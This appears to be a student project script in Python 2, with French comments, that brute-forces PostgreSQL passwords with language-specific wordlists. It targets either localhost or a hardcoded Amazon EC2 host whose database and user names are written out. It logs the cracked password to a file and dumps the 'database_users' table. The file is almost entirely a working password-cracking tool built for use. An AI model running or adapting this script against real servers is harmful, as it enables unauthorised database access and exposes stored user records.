import os
import sqlalchemy
import sys,time
from sqlalchemy import create_engine, MetaData, Table

""" Projet partie 2 : Script d'attaque par brute force """

""" Joel CORNET et Moise DOUARIN """


class bruteforce(object):
    global readFile
    def __init__(self):
        """le constructeur ou l'on recupere le langue par argument

        self.langue= sys.argv[1].strip()

        on appelle la fonction verification
        self.verification()
        """
        try:
            if len(sys.argv)>=2:
                self.langue= sys.argv[1].strip()
                self.statut= sys.argv[2].strip()
                self.verification()
            else:
                print "Usage: scriptCracking.py <fr/an/es> <online/offline>"
                exit()
        except NameError:
            print 'Nameerror'
            sys.exit(1)
            
    def verification(self):
        """La fonction qui permet de verification de la langue choisie et fait
        appel au dictionnaire correspondant. 

        """
        if self.statut.lower().__eq__("online"):
            self.connect('ec2-54-197-238-8.compute-1.amazonaws.com','5432','d8okel9qt3b32h','xkkepxphneumrj')
        elif self.statut.lower().__eq__("offline"):
            self.connect('127.0.0.1','5432','projetDjango','postgres')
        else:
            print "Il te faut un statut (online-offline)."
            exit()
            
        if self.langue.lower().__eq__("fr"):
            self.crackpassword("francaisdico.txt")
        elif self.langue.lower().__eq__("an"):
            self.crackpassword("anglaisdico.txt")
        elif self.langue.lower().__eq__("es"):
            self.crackpassword("espagnoldico.txt")
        else:
            print "Il te faut une langue (Anglais-Francais-Espagnol)."
            exit()
        self.affiche()
    
    
    def connect(self,host,port,base,user):
        """Recupere les infos necessaire pour la connection a la base soit
        en local ou online
        """
        self.host = host
        self.port = port
        self.base = base
        self.user = user
        
    def readFile(dictionnaire):
        """Apres la verification la lecture du dictionnaire en question ce fait
        ici, par une ouverture en mode lecture.
        """
        dico = dictionnaire
        try:
            fd = open(dico, "r")
            password_list = fd.readlines()
            return password_list
        except IOError:
            print "File not found or corrupted !"

    def affiche(self):
        """Cette fonction fait l'affichage du mot de passe trouve lors du force
        brute qu'on avait garder dans un fichier.
        """
        r = open("PassFound.txt", "r")
        re = r.read()
        print(re)
        r.close()

        metadata = MetaData(self.engine)
        metadata.reflect(self.engine)
        metadata.tables.keys()
        users = Table('database_users', metadata, autoload=True)
        s = users.select()
        rs = s.execute()
        table = ()
        for row in rs:
            print row


    def crackpassword(self,dictionnaire):
        """Dans cette fonction on envoie le dictionnaire pour qu'il puisse etre
        ouvert en mode lecture par readFile et on recupere les infos dans une
        liste.
        On fait l'ouverture en mode ecriture du fichier qui va recevoir le mot
        de passe trouve.
        Ensuite on fait une verification de chaque mot de la liste en se connectant
        a la base en considerant l'host, le port, la base et l'utilisateur.
        si le mot est celui de la base on le recupere dans le fichier destine
        a l'affichage.
        """
        self.dico = dictionnaire
        self.liste_pass = readFile(self.dico)
        result = open("PassFound.txt", "w")
        
        for self.password in self.liste_pass:
            #si la connection echoue on leve l'exception 
            try:
##                self.engine = create_engine('postgresql://xkkepxphneumrj:'+self.password.strip()+'@ec2-54-197-238-8.compute-1.amazonaws.com:5432/d8okel9qt3b32h', echo=False)
                self.engine = create_engine('postgresql://'+self.user+':'+self.password.strip()+'@'+self.host+':'+self.port+'/'+self.base, echo=False)
                self.engine.connect()
                ##si on a ete connecte ce msg s'affiche on met le mot de passe
                ##dans le fichier
                print("Password Cracked !")
                result.write("Password: {0}".format(self.password))
                break
            except:
                #Si on n'a pas pu ce connecte on affiche ce msg et on continue
                # la verification
                print("Cracking password with "+self.password+" failed")
            time.sleep(0.1)
        #on ferme le fichier qu'on a ouvert pour la recuperation du mot de passe
        result.close()
            



bruteforce()

           
        
